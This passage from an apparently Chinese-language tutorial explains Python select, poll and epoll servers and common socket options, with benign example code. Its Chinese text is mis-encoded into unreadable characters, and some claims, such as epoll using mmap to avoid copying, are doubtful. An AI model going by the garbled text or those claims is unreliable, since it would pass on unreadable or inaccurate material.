class="hljs-literal">False</span>)<br><br><span class="hljs-comment"># è¦ç›‘å¬çš„socketåˆ—è¡¨</span><br>inputs = [server]<br>outputs = []<br><br><span class="hljs-keyword">while</span> inputs:<br>    <span class="hljs-comment"># ç­‰å¾…è‡³å°‘ä¸€ä¸ªsocketå°±ç»ª</span><br>    readable, writable, exceptional = select.select(<br>        inputs, outputs, inputs, <span class="hljs-number">1.0</span><br>    )<br><br>    <span class="hljs-comment"># å¤„ç†å¯è¯»çš„socket</span><br>    <span class="hljs-keyword">for</span> sock <span class="hljs-keyword">in</span> readable:<br>        <span class="hljs-keyword">if</span> sock <span class="hljs-keyword">is</span> server:<br>            <span class="hljs-comment"># æœåŠ¡å™¨socketå°±ç»ªï¼šæœ‰æ–°è¿æ¥</span><br>            client, addr = sock.accept()<br>            client.setblocking(<span class="hljs-literal">False</span>)<br>            inputs.append(client)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æ–°è¿æ¥: <span class="hljs-subst">&#123;addr&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># å®¢æˆ·ç«¯socketå°±ç»ªï¼šæœ‰æ•°æ®</span><br>            data = sock.recv(<span class="hljs-number">1024</span>)<br>            <span class="hljs-keyword">if</span> data:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æ”¶åˆ°æ•°æ®: <span class="hljs-subst">&#123;data&#125;</span>&quot;</span>)<br>                <span class="hljs-comment"># å‘é€å“åº”</span><br>                sock.send(data)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># å®¢æˆ·ç«¯æ–­å¼€</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å®¢æˆ·ç«¯æ–­å¼€&quot;</span>)<br>                inputs.remove(sock)<br>                sock.close()<br></code></pre></td></tr></table></figure><p><strong>selectçš„é™åˆ¶</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> ç›‘å¬æ•°é‡é™åˆ¶<br><span class="hljs-bullet">   -</span> Linuxé»˜è®¤ï¼š1024ä¸ªsocket<br><span class="hljs-bullet">   -</span> ç”±FD<span class="hljs-emphasis">_SETSIZEå®šä¹‰</span><br><span class="hljs-emphasis">   - æ— æ³•ä¿®æ”¹ï¼ˆç¼–è¯‘æ—¶ç¡®å®šï¼‰</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">2. æ€§èƒ½é—®é¢˜</span><br><span class="hljs-emphasis">   - æ¯æ¬¡è°ƒç”¨selectéƒ½è¦æŠŠfd_</span>setä»ç”¨æˆ·ç©ºé—´æ‹·è´åˆ°å†…æ ¸<br><span class="hljs-bullet">   -</span> å†…æ ¸éœ€è¦éå†æ‰€æœ‰fdï¼Œæ£€æŸ¥æ˜¯å¦å°±ç»ª<br><span class="hljs-bullet">   -</span> O(n)å¤æ‚åº¦<br><br><span class="hljs-bullet">3.</span> ä¸æ”¯æŒè¾¹ç¼˜è§¦å‘<br><span class="hljs-bullet">   -</span> åªæ”¯æŒæ°´å¹³è§¦å‘ï¼ˆLevel Triggerï¼‰<br><br><span class="hljs-bullet">4.</span> è¿”å›åéœ€è¦éå†<br><span class="hljs-bullet">   -</span> selectåªå‘Šè¯‰ä½ &quot;æœ‰socketå°±ç»ª&quot;<br><span class="hljs-bullet">   -</span> ä¸å‘Šè¯‰ä½ &quot;å“ªäº›socketå°±ç»ª&quot;<br><span class="hljs-bullet">   -</span> éœ€è¦è‡ªå·±éå†æ‰€æœ‰socketæ£€æŸ¥<br></code></pre></td></tr></table></figure><h3 id="2-3-poll"><a href="#2-3-poll" class="headerlink" title="2.3 poll"></a>2.3 poll</h3><p><strong>pollæ”¹è¿›</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> select<br><br><span class="hljs-comment"># åˆ›å»ºpollå¯¹è±¡</span><br>poll_obj = select.poll()<br><br><span class="hljs-comment"># æ³¨å†Œsocket</span><br>poll_obj.register(sock1, select.POLLIN)<br>poll_obj.register(sock2, select.POLLIN | select.POLLOUT)<br><br><span class="hljs-comment"># ç­‰å¾…äº‹ä»¶</span><br>events = poll_obj.poll(timeout)<br><br><span class="hljs-comment"># å¤„ç†äº‹ä»¶</span><br><span class="hljs-keyword">for</span> fd, event <span class="hljs-keyword">in</span> events:<br>    <span class="hljs-keyword">if</span> event &amp; select.POLLIN:<br>        <span class="hljs-comment"># å¯è¯»</span><br>        data = sockets[fd].recv(<span class="hljs-number">1024</span>)<br>    <span class="hljs-keyword">if</span> event &amp; select.POLLOUT:<br>        <span class="hljs-comment"># å¯å†™</span><br>        sockets[fd].send(data)<br></code></pre></td></tr></table></figure><p><strong>poll vs select</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">pollçš„ä¼˜ç‚¹ï¼š<br>âœ… æ²¡æœ‰æœ€å¤§æ–‡ä»¶æè¿°ç¬¦é™åˆ¶<br>âœ… ä½¿ç”¨pollfdç»“æ„ä½“æ•°ç»„ï¼Œä¸éœ€è¦æ¯æ¬¡éƒ½æ‹·è´æ•´ä¸ªé›†åˆ<br><br>pollçš„ç¼ºç‚¹ï¼š<br>âŒ ä»ç„¶æ˜¯O(n)å¤æ‚åº¦<br>âŒ ä»éœ€è¦ä»ç”¨æˆ·ç©ºé—´æ‹·è´åˆ°å†…æ ¸ç©ºé—´<br>âŒ Windowsä¸æ”¯æŒ<br><br>å…±åŒç‚¹ï¼š<br><span class="hljs-bullet">- </span>éƒ½æ˜¯æ°´å¹³è§¦å‘<br><span class="hljs-bullet">- </span>éƒ½éœ€è¦éå†æ‰€æœ‰fd<br></code></pre></td></tr></table></figure><h3 id="2-4-epollï¼ˆLinuxä¸“ç”¨ï¼‰"><a href="#2-4-epollï¼ˆLinuxä¸“ç”¨ï¼‰" class="headerlink" title="2.4 epollï¼ˆLinuxä¸“ç”¨ï¼‰"></a>2.4 epollï¼ˆLinuxä¸“ç”¨ï¼‰</h3><p><strong>epollçš„ä¼˜åŠ¿</strong>ï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">epoll</span> <span class="hljs-operator">=</span> é«˜æ€§èƒ½çš„IOå¤šè·¯å¤ç”¨<br><br>ä¼˜ç‚¹ï¼š<br>âœ… æ²¡æœ‰æœ€å¤§æ–‡ä»¶æè¿°ç¬¦é™åˆ¶<br>âœ… O(<span class="hljs-number">1</span>)å¤æ‚åº¦ï¼ˆåªè¿”å›å°±ç»ªçš„fdï¼‰<br>âœ… æ”¯æŒè¾¹ç¼˜è§¦å‘ï¼ˆEdge Triggerï¼‰<br>âœ… ä½¿ç”¨å†…å­˜æ˜ å°„ï¼ˆmmapï¼‰ï¼Œå‡å°‘æ‹·è´<br><br>epollæ˜¯Linuxä¸‹é«˜æ€§èƒ½ç½‘ç»œç¼–ç¨‹çš„é¦–é€‰ï¼<br></code></pre></td></tr></table></figure><p><strong>epollä½¿ç”¨</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> select<br><br><span class="hljs-comment"># åˆ›å»ºepollå¯¹è±¡</span><br>epoll = select.epoll()<br><br><span class="hljs-comment"># æ³¨å†Œsocket</span><br>epoll.register(sock.fileno(), select.EPOLLIN)<br><br><span class="hljs-comment"># ç­‰å¾…äº‹ä»¶</span><br>events = epoll.poll(timeout)<br><br><span class="hljs-comment"># eventsæ˜¯å·²å°±ç»ªçš„fdåˆ—è¡¨ï¼ˆä¸éœ€è¦éå†æ‰€æœ‰fdï¼‰</span><br><span class="hljs-keyword">for</span> fd, event <span class="hljs-keyword">in</span> events:<br>    <span class="hljs-keyword">if</span> event &amp; select.EPOLLIN:<br>        <span class="hljs-comment"># å¯è¯»</span><br>        data = sockets[fd].recv(<span class="hljs-number">1024</span>)<br>    <span class="hljs-keyword">if</span> event &amp; select.EPOLLOUT:<br>        <span class="hljs-comment"># å¯å†™</span><br>        sockets[fd].send(data)<br></code></pre></td></tr></table></figure><p><strong>epollæœåŠ¡å™¨ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> select<br><span class="hljs-keyword">import</span> socket<br><br>server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>server.bind((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">8888</span>))<br>server.listen(<span class="hljs-number">5</span>)<br>server.setblocking(<span class="hljs-literal">False</span>)<br><br>epoll = select.epoll()<br>epoll.register(server.fileno(), select.EPOLLIN)<br><br>connections = &#123;&#125;<br>requests = &#123;&#125;<br>responses = &#123;&#125;<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        events = epoll.poll(<span class="hljs-number">1</span>)<br><br>        <span class="hljs-keyword">for</span> fileno, event <span class="hljs-keyword">in</span> events:<br>            <span class="hljs-keyword">if</span> fileno == server.fileno():<br>                <span class="hljs-comment"># æ–°è¿æ¥</span><br>                client, addr = server.accept()<br>                client.setblocking(<span class="hljs-literal">False</span>)<br>                epoll.register(client.fileno(), select.EPOLLIN)<br>                connections[client.fileno()] = client<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æ–°è¿æ¥: <span class="hljs-subst">&#123;addr&#125;</span>&quot;</span>)<br><br>            <span class="hljs-keyword">elif</span> event &amp; select.EPOLLIN:<br>                <span class="hljs-comment"># å¯è¯»</span><br>                data = connections[fileno].recv(<span class="hljs-number">1024</span>)<br>                <span class="hljs-keyword">if</span> data:<br>                    requests[fileno] = data<br>                    <span class="hljs-comment"># ä¿®æ”¹ä¸ºç­‰å¾…å¯å†™</span><br>                    epoll.modify(fileno, select.EPOLLOUT)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-comment"># æ–­å¼€è¿æ¥</span><br>                    epoll.unregister(fileno)<br>                    connections[fileno].close()<br>                    <span class="hljs-keyword">del</span> connections[fileno]<br><br>            <span class="hljs-keyword">elif</span> event &amp; select.EPOLLOUT:<br>                <span class="hljs-comment"># å¯å†™</span><br>                response = requests[fileno]<br>                connections[fileno].send(response)<br>                <span class="hljs-comment"># ä¿®æ”¹ä¸ºç­‰å¾…å¯è¯»</span><br>                epoll.modify(fileno, select.EPOLLIN)<br>                <span class="hljs-keyword">del</span> requests[fileno]<br><br><span class="hljs-keyword">finally</span>:<br>    epoll.unregister(server.fileno())<br>    epoll.close()<br>    server.close()<br></code></pre></td></tr></table></figure><p><strong>epollè§¦å‘æ¨¡å¼</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">æ°´å¹³è§¦å‘ï¼ˆLevel Triggerï¼ŒLTï¼‰ï¼š<br><span class="hljs-bullet">- </span>é»˜è®¤æ¨¡å¼<br><span class="hljs-bullet">- </span>åªè¦fdå°±ç»ªï¼Œå°±ä¼šä¸€ç›´é€šçŸ¥<br><span class="hljs-bullet">- </span>å®‰å…¨ä½†å¯èƒ½æœ‰æ€§èƒ½æŸå¤±<br><br>ç¤ºä¾‹ï¼š<br>socketç¼“å†²åŒºæœ‰100å­—èŠ‚æ•°æ®<br>ä½ åªè¯»äº†50å­—èŠ‚<br>ä¸‹æ¬¡epoll_waitè¿˜ä¼šé€šçŸ¥ä½ ï¼ˆè¿˜æœ‰50å­—èŠ‚æœªè¯»ï¼‰<br><br>è¾¹ç¼˜è§¦å‘ï¼ˆEdge Triggerï¼ŒETï¼‰ï¼š<br><span class="hljs-bullet">- </span>é«˜æ€§èƒ½æ¨¡å¼<br><span class="hljs-bullet">- </span>åªåœ¨fdçŠ¶æ€å˜åŒ–æ—¶é€šçŸ¥ä¸€æ¬¡<br><span class="hljs-bullet">- </span>å¿…é¡»ä¸€æ¬¡æ€§å¤„ç†å®Œæ‰€æœ‰æ•°æ®<br><br>ç¤ºä¾‹ï¼š<br>socketç¼“å†²åŒºæœ‰100å­—èŠ‚æ•°æ®<br>ä½ åªè¯»äº†50å­—èŠ‚<br>ä¸‹æ¬¡epoll_waitä¸ä¼šé€šçŸ¥ä½ ï¼ˆç›´åˆ°æœ‰æ–°æ•°æ®åˆ°è¾¾ï¼‰<br>å¿…é¡»å¾ªç¯è¯»å–ç›´åˆ°EAGAINé”™è¯¯<br><br>é€‰æ‹©ï¼š<br><span class="hljs-bullet">- </span>LTï¼šç®€å•å®‰å…¨ï¼Œé€‚åˆå¤§å¤šæ•°åœºæ™¯<br><span class="hljs-bullet">- </span>ETï¼šé«˜æ€§èƒ½ï¼Œéœ€è¦å°å¿ƒå¤„ç†<br></code></pre></td></tr></table></figure><h3 id="2-5-select-poll-epollå¯¹æ¯”"><a href="#2-5-select-poll-epollå¯¹æ¯”" class="headerlink" title="2.5 select&#x2F;poll&#x2F;epollå¯¹æ¯”"></a>2.5 select&#x2F;poll&#x2F;epollå¯¹æ¯”</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚   ç‰¹æ€§       â”‚  <span class="hljs-selector-tag">select</span>  â”‚   poll   â”‚  epoll   â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ æœ€å¤§è¿æ¥æ•°   â”‚   <span class="hljs-number">1024</span>   â”‚   æ— é™åˆ¶ â”‚  æ— é™åˆ¶  â”‚<br>â”‚ å¤æ‚åº¦       â”‚   <span class="hljs-built_in">O</span>(n)   â”‚   <span class="hljs-built_in">O</span>(n)   â”‚   <span class="hljs-built_in">O</span>(<span class="hljs-number">1</span>)   â”‚<br>â”‚ è·¨å¹³å°       â”‚    âœ…    â”‚  éƒ¨åˆ†âœ…  â”‚    âŒ    â”‚<br>â”‚ æ€§èƒ½         â”‚    ä½    â”‚    ä¸­    â”‚    é«˜    â”‚<br>â”‚ è¾¹ç¼˜è§¦å‘     â”‚    âŒ    â”‚    âŒ    â”‚    âœ…    â”‚<br>â”‚ é€‚ç”¨åœºæ™¯     â”‚ å°‘é‡è¿æ¥ â”‚ ä¸­ç­‰è¿æ¥ â”‚ å¤§é‡è¿æ¥ â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>æ¨èä½¿ç”¨ï¼š<br>- Linuxï¼šepollï¼ˆæœ€ä¼˜ï¼‰<br>- Windowsï¼šIOCPï¼ˆå®Œæˆç«¯å£ï¼Œä¸æ˜¯<span class="hljs-selector-tag">select</span>ï¼‰<br>- è·¨å¹³å°ï¼špollï¼ˆæˆ–é«˜çº§æ¡†æ¶å¦‚asyncioã€Twistedï¼‰<br></code></pre></td></tr></table></figure><hr><h2 id="3-Socketé€‰é¡¹"><a href="#3-Socketé€‰é¡¹" class="headerlink" title="3. Socketé€‰é¡¹"></a>3. Socketé€‰é¡¹</h2><h3 id="3-1-å¸¸ç”¨Socketé€‰é¡¹"><a href="#3-1-å¸¸ç”¨Socketé€‰é¡¹" class="headerlink" title="3.1 å¸¸ç”¨Socketé€‰é¡¹"></a>3.1 å¸¸ç”¨Socketé€‰é¡¹</h3><p><strong>SO_REUSEADDR</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å…è®¸åœ°å€é‡ç”¨</span><br>sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br><br>ä½œç”¨ï¼š<br><span class="hljs-number">1.</span> å…è®¸åœ¨TIME_WAITçŠ¶æ€ä¸‹é‡æ–°ç»‘å®šç«¯å£<br><span class="hljs-number">2.</span> å¤šä¸ªsocketç»‘å®šåˆ°åŒä¸€ä¸ªç«¯å£ï¼ˆä¸åŒæ¥å£ï¼‰<br><br>åœºæ™¯ï¼š<br>æœåŠ¡å™¨é‡å¯æ—¶ï¼Œä¹‹å‰çš„è¿æ¥å¯èƒ½è¿˜åœ¨TIME_WAITçŠ¶æ€<br>å¦‚æœä¸è®¾ç½®æ­¤é€‰é¡¹ï¼Œbind()ä¼šå¤±è´¥ï¼š<span class="hljs-string">&quot;Address already in use&quot;</span><br><br>æ¨èï¼š<br>æœåŠ¡å™¨åº”è¯¥æ€»æ˜¯è®¾ç½®æ­¤é€‰é¡¹<br></code></pre></td></tr></table></figure><p><strong>SO_REUSEPORT</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å…è®¸ç«¯å£é‡ç”¨ï¼ˆè´Ÿè½½å‡è¡¡ï¼‰</span><br>sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, <span class="hljs-number">1</span>)<br><br>ä½œç”¨ï¼š<br>å¤šä¸ªè¿›ç¨‹å¯ä»¥ç»‘å®šåˆ°åŒä¸€ä¸ªç«¯å£<br>å†…æ ¸ä¼šè‡ªåŠ¨è´Ÿè½½å‡è¡¡ï¼ˆåˆ†å‘è¿æ¥ï¼‰<br><br>ä½¿ç”¨åœºæ™¯ï¼š<br>å¤šè¿›ç¨‹æœåŠ¡å™¨ï¼Œæ¯ä¸ªè¿›ç¨‹ç›‘å¬åŒä¸€ç«¯å£<br></code></pre></td></tr></table></figure><p><strong>TCP_NODELAY</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ç¦ç”¨Nagleç®—æ³•</span><br>sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, <span class="hljs-number">1</span>)<br><br>Nagleç®—æ³•ï¼š<br>- å°æ•°æ®åŒ…ä¼šè¢«å»¶è¿Ÿå‘é€ï¼Œç­‰å¾…åˆå¹¶<br>- å‡å°‘ç½‘ç»œåŒ…æ•°é‡<br>- ä½†å¢åŠ å»¶è¿Ÿ<br><br>ç¦ç”¨åœºæ™¯ï¼š<br>- äº¤äº’å¼åº”ç”¨ï¼ˆSSHã€Telnetï¼‰<br>- ä½å»¶è¿Ÿè¦æ±‚ï¼ˆæ¸¸æˆã€VoIPï¼‰<br>- å·²ç»åšäº†åº”ç”¨å±‚ç¼“å†²<br><br>ä¿ç•™åœºæ™¯ï¼š<br>- æ‰¹é‡æ•°æ®ä¼ è¾“<br>- å¯¹å»¶è¿Ÿä¸æ•æ„Ÿ<br></code></pre></td></tr></table></figure><p><strong>SO_KEEPALIVE</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å¯ç”¨TCPä¿æ´»æœºåˆ¶</span><br>sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, <span class="hljs-number">1</span>)<br><br>ä½œç”¨ï¼š<br>å®šæœŸå‘é€æ¢æµ‹åŒ…ï¼Œæ£€æµ‹è¿æ¥æ˜¯å¦è¿˜æ´»ç€<br><br>å‚æ•°ï¼ˆLinuxï¼‰ï¼š<br>TCP_KEEPIDLE: ç©ºé—²å¤šä¹…åå¼€å§‹æ¢æµ‹ï¼ˆé»˜è®¤<span class="hljs-number">2</span>å°æ—¶ï¼‰<br>TCP_KEEPINTVL: æ¢æµ‹é—´éš”ï¼ˆé»˜è®¤<span class="hljs-number">75</span>ç§’ï¼‰<br>TCP_KEEPCNT: æ¢æµ‹æ¬¡æ•°ï¼ˆé»˜è®¤<span class="hljs-number">9</span>æ¬¡ï¼‰<br><br>ç¤ºä¾‹ï¼š<br>sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, <span class="hljs-number">60</span>)<br>sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, <span class="hljs-number">10</span>)<br>sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, <span class="hljs-number">3</span>)<br><span class="hljs-comment"># 60ç§’åå¼€å§‹æ¢æµ‹ï¼Œæ¯10ç§’ä¸€æ¬¡ï¼Œå¤±è´¥3æ¬¡åå…³é—­è¿æ¥</span><br></code></pre></td></tr></table></figure><p><strong>SO_RCVBUF &#x2F; SO_SNDBUF</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># è®¾ç½®æ¥æ”¶/å‘é€ç¼“å†²åŒºå¤§å°</span><br>sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, <span class="hljs-number">128</span> * <span class="hljs-number">1024</span>)  <span class="hljs-comment"># 128KB</span><br>sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, <span class="hljs-number">128</span> * <span class="hljs-number">1024</span>)<br><br>ä½œç”¨ï¼š<br>è°ƒæ•´socketç¼“å†²åŒºå¤§å°<br><br>åœºæ™¯ï¼š<br>- é«˜å¸¦å®½ç½‘ç»œï¼šå¢å¤§ç¼“å†²åŒº<br>- ä½å»¶è¿Ÿè¦æ±‚ï¼šå‡å°ç¼“å†²åŒº<br></code></pre></td></tr></table></figure><p><strong>SO_LINGER</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># è®¾ç½®å…³é—­æ—¶çš„è¡Œä¸º</span><br><span class="hljs-keyword">import</span> struct<br>linger = struct.pack(<span class="hljs-string">&#x27;ii&#x27;</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>)  <span class="hljs-comment"># å¯ç”¨ï¼Œç­‰å¾…10ç§’</span><br>sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, linger)<br><br>å‚æ•°ï¼š<br>l_onoff: <span class="hljs-number">0</span>=ç¦ç”¨, <span class="hljs-number">1</span>=å¯ç”¨<br>l_linger: ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰<br><br>è¡Œä¸ºï¼š<br>l_onoff=<span class="hljs-number">0</span>: close()ç«‹å³è¿”å›ï¼Œåå°ç»§ç»­å‘é€<br>l_onoff=<span class="hljs-number">1</span>, l_linger&gt;<span class="hljs-number">0</span>: close()ç­‰å¾…æ•°æ®å‘é€å®Œæˆ–è¶…æ—¶<br>l_onoff=<span class="hljs-number">1</span>, l_linger=<span class="hljs-number">0</span>: close()ç«‹å³è¿”å›ï¼Œå‘é€RSTï¼ˆä¸¢å¼ƒæ•°æ®ï¼‰<br><br>ä½¿ç”¨åœºæ™¯ï¼š<br>ä¸€èˆ¬ä¸è®¾ç½®ï¼Œä½¿ç”¨é»˜è®¤è¡Œä¸º<br></code></pre></td></tr></table></figure><h3 id="3-2-è·å–Socketé€‰é¡¹"><a href="#3-2-è·å–Socketé€‰é¡¹" class="headerlink" title="3.2 è·å–Socketé€‰é¡¹"></a>3.2 è·å–Socketé€‰é¡¹</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td 